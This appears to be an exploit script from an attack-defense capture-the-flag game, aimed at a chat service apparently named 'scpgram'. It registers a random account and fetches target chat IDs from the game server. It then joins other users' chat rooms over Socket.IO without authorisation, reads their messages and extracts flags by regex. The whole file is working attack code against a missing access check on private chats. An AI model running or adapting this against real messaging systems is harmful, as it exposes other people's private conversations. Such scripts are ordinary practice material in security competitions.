import socketio
import re
import requests
import sys
import json
from checklib import *

sio = socketio.SimpleClient()
session = requests.Session()
regex = re.compile('[A-Z0-9]{31}=')

FORCAD_IP = '10.10.10.10'
IP = sys.argv[1]
PORT = 17788


def login(usr: str, pas: str):
    session.post(f'http://{IP}:{PORT}/login', data={
        'username': usr,
        'password': pas,
        'action':'signup'

    })
    session.post(f'http://{IP}:{PORT}/login', data={
        'username': usr,
        'password': pas,
        'action':'signin'

    })
    return session.cookies.get_dict()['session']


def get_messages(cookie: str, chat_uuid: str):
    sio.connect(f'http://{IP}:{PORT}', headers={'Cookie':f'session={cookie}'}, wait_timeout=10)
    sio.emit('join_room', {'chat_id': chat_uuid})
    sio.emit('get_messages', {'chat_id': chat_uuid})
    event = sio.receive()
    sio.disconnect()
    return event[1]['message']


def get_chat_uuids():
    data = requests.get(f'http://{FORCAD_IP}/api/client/attack_data')
    data = data.json()['scpgram'][IP]
    return data



sess = login(rnd_username(), rnd_password())
attack_data = get_chat_uuids()
for chat_uuid in attack_data:
    mess = get_messages(sess, chat_uuid)
    print(re.findall(regex, mess)[0])


